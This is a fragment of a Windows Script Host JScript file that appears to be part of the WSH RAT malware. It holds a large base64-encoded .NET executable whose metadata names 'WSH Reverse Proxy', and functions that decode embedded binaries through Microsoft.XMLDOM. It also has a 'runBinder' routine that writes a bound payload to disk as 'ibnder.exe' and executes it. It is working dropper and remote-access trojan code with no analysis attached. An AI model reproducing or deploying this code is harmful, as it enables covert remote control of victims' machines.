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AAAUgBlAHYAZQByAHMAZQBQAHIAbwB4AHkALgBlAHgAZQAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA5AAAATAARAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAFIAZQB2AGUAcgBzAGUAUAByAG8AeAB5AC4AZQB4AGUAAAAAACwABgABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAVwBzAGgAUgBQAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAACgAAAAgAAAAQAAAAAEABAAAAAAAgAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAgICAAMDAwAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB3d3d3d3d3d3d3d3d3d3AERERERERERERERERERERwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBIiIiIiIiIiIiIiIiIiEcARERERERERERERERERERHAETExMTExMTExMTs7OSXRwBMzMzMzMzMzMzMzMzMzEAABEREREREREREREREREQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////////////////////wAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAADwAAAB////////////////ygAAAAQAAAAIAAAAAEABAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAgICAAMDAwAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD///8AAAAAAAAAAAAHd3d3d3d3d0RERERERERHT///////+EdP///////4R0////////hHT///////+EdP///////4R0////////hHT///////+EdP///////4R0iIiIiIiIhHTMzMzMzMzEfEREREREREwAAAAAAAAAAAAAAAAAAAAAD//wAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAP//AAD//wAAAAABAAIAICAQAAEABADoAgAAAgAQEBAAAQAEACgBAAADAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAAMAAAAsDIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	var spike = (WScript.CreateObject("Microsoft.XMLDOM")).createElement("tmp");
	spike.dataType = "bin.base64";
	spike.text = encoded;
	return spike.nodeTypedValue;
}

function getBinder(){
	var encoded = "[binder]";
	if(encoded != "[binder]"){
		var spike = (WScript.CreateObject("Microsoft.XMLDOM")).createElement("tmp");
		spike.dataType = "bin.base64";
		spike.text = encoded;
		return spike.nodeTypedValue;
	}else{
		return null;
	}
}

function runBinder(){
var strsaveto = installdir + "ibnder.exe";

var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
if(objfsodownload.fileExists(strsaveto)){
    objfsodownload.deleteFile(strsaveto);
}
 
  try{
    var  objstreamdownload = WScript.CreateObject("adodb.stream");
    objstreamdownload.Type = 1; 
    objstreamdownload.Open();
	objstreamdownload.Write(getBinder());
    objstreamdownload.SaveToFile(strsaveto);
    objstreamdownload.close();
    
    objstreamdownload = null;
	}catch(err){
		updatestatus("Access+Denied");
	}
 
 if(objfsodownload.fileExists(strsaveto)){
   shellobj.run("\"" + strsaveto + "\"");
 } 
}